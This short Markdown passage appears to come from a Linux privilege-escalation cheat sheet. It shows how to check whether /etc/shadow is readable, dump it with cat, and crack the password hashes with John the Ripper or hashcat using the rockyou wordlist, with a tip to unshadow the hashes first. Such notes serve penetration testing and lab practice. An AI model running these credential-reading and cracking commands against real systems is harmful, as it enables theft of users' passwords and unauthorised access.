- - -
### Readable /etc/shadow :

###### check If you can read it :

```sh
ls -l /etc/shadow

cat /etc/shadow
```

copy the hash-file and use **john**/**hashcat** to crack it : 

```sh
john hashtocrack.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

> [! Note ]
>  If you are using "**JohnTheRipper**" , Make sure to **unshadow** hashes before cracking them.


- - -

